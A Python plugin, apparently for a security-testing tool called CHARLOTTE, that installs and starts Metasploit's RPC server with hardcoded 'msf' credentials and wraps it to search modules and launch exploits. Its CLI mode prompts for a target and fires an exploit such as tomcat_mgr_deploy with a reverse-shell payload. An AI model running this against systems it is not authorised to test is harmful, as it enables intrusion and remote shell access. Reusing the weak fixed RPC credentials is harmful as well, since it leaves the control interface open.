# ******************************************************************************************
# metasploit_plugin.py
# CHARLOTTE plugin for interacting with the Metasploit RPC interface.
# Uses pymetasploit3 for RPC control. Attempts to auto-locate and start msfrpcd.
# ******************************************************************************************

import os
import sys
import subprocess
import time
import platform
import shutil
from pprint import pprint

# ==========================================================================================
# ATTEMPT TO IMPORT CHARLOTTE-COMPATIBLE Metasploit CLIENT
# ==========================================================================================
try:
    from gc_metasploit import Metasploit
    print("[+] Successfully imported Metasploit from gc-metasploit.")
except ImportError as e:
    import gc_metasploit
    print("[!] Could not import 'Metasploit' from 'gc_metasploit'.")
    print("[!] Available attributes in gc_metasploit:", dir(gc_metasploit))
    raise e

# ==========================================================================================
# FUNCTION: find_and_patch_metasploit_path()
# Tries to find msfconsole/msfrpcd in common locations and patch into PATH
# On Windows: also adds to user PATH persistently
# ==========================================================================================
def find_and_patch_metasploit_path():
    common_paths = [
        "C:\\metasploit-framework\\bin",                             # Windows default
        "C:\\Program Files\\metasploit-framework\\bin",             # Alternate
        "/opt/metasploit-framework/bin",                            # Linux default
        "/usr/local/bin", "/usr/bin", "/bin"                        # Unix system paths
    ]

    for path in common_paths:
        msfconsole = os.path.join(path, "msfconsole.bat" if platform.system() == "Windows" else "msfconsole")
        if os.path.exists(msfconsole):
            # Patch for current session
            os.environ["PATH"] += os.pathsep + path
            print(f"[+] Found Metasploit tools in: {path}")

            # On Windows, persist to user environment
            if platform.system() == "Windows":
                try:
                    subprocess.run([
                        "powershell",
                        "-Command",
                        f"[Environment]::SetEnvironmentVariable('Path', $env:Path + ';{path}', 'User')"
                    ], check=True)
                    print(f"[+] Added {path} to user PATH persistently.")
                except Exception as e:
                    print(f"[!] Failed to persist PATH on Windows: {e}")
            return True
    return False


# ==========================================================================================
# FUNCTION: install_metasploit()
# Triggers download or install of Metasploit depending on platform
# ==========================================================================================
def install_metasploit():
    import webbrowser

    print("[*] Metasploit not found. Attempting installation...")

    if platform.system() in ["Linux", "Darwin"]:
        try:
            subprocess.run(
                "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall",
                shell=True, check=True)
            subprocess.run("chmod 755 msfinstall", shell=True, check=True)
            subprocess.run("./msfinstall", shell=True, check=True)
            print("[+] Metasploit installed successfully.")
        except Exception as e:
            print(f"[!] Failed during install: {e}")
    elif platform.system() == "Windows":
        url = "https://windows.metasploit.com/metasploitframework-latest.msi"
        print("[*] Launching installer for Windows Metasploit Framework...")
        webbrowser.open(url)
        print(f"[+] Download started: {url}")
        print("[*] After installation, restart your shell or add to PATH manually.")
    else:
        print("[!] Unsupported platform for auto-installation.")

# ==========================================================================================
# FUNCTION: start_msf_rpc()
# Starts msfrpcd in the background if it's not already running
# ==========================================================================================
def start_msf_rpc():
    print("[*] Attempting to start Metasploit RPC server...")

    if not shutil.which("msfrpcd"):
        if not find_and_patch_metasploit_path():
            print("[!] Metasploit is not installed or not in PATH.")
            install_metasploit()
            return False

    try:
        subprocess.Popen([
            "msfrpcd", "-P", "msf", "-S", "-U", "msf", "-a", "127.0.0.1", "-p", "55553"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)  # Wait for msfrpcd to start
        return True
    except Exception as e:
        print(f"[!] Failed to launch Metasploit RPC: {e}")
        return False

# ==========================================================================================
# CLASS: MetasploitInterface
# Handles CHARLOTTE-side interaction with Metasploit through pymetasploit3
# ==========================================================================================
class MetasploitInterface:
    def __init__(self, username='msf', password='msf', ssl=False, port=55553, host='127.0.0.1'):
        if not start_msf_rpc():
            print("[!] Could not start or connect to Metasploit RPC. Exiting.")
            self.client = None
            return

        try:
            self.client = Metasploit(password=password, username=username, ssl=ssl, port=port, host=host)
            print("[+] Connected to Metasploit RPC.")
        except Exception as e:
            print(f"[!] Failed to connect to Metasploit RPC: {e}")
            self.client = None

    def list_exploits(self):
        if self.client:
            return self.client.list_exploits()
        return []

    def search_module(self, keyword):
        if self.client:
            return self.client.search(keyword)
        return []

    def run_exploit(self, exploit_path, payload="generic/shell_reverse_tcp", rhost="", lhost="127.0.0.1", lport="4444"):
        if self.client:
            result = self.client.run_exploit(
                exploit_path,
                payload=payload,
                rhost=rhost,
                lhost=lhost,
                lport=lport
            )
            print(f"[+] Exploit {exploit_path} launched with {payload}")
            print(result)
        else:
            print("[!] Metasploit RPC client is not connected.")

# ==========================================================================================
# MAIN: Standalone test mode for CLI use
# ==========================================================================================
if __name__ == "__main__":
    msf = MetasploitInterface()

    # Show available exploits
    print("\n[+] Available Exploits:")
    exploits = msf.list_exploits()
    for e in exploits[:10]:
        print(f" - {e}")

    # Run search
    print("\n[+] Search for 'tomcat':")
    pprint(msf.search_module("tomcat"))

    # Run exploit
    print("\n[+] Running example exploit:")
    exploit_path = input("Which exploit would you like to run? (e.g., multi/http/tomcat_mgr_deploy): ").strip()
    if not exploit_path:
        exploit_path = "multi/http/tomcat_mgr_deploy"

    rhost = input("Enter RHOST (target IP): ").strip() or "127.0.0.1"
    lhost = input("Enter LHOST (local IP for reverse shell): ").strip() or "127.0.0.1"
    lport = input("Enter LPORT (local port for reverse shell): ").strip() or "4444"

    msf.run_exploit(exploit_path, rhost=rhost, lhost=lhost, lport=lport)

    print("[*] Metasploit interaction complete.")

# ==========================================================================================
# END OF FILE
# ==========================================================================================
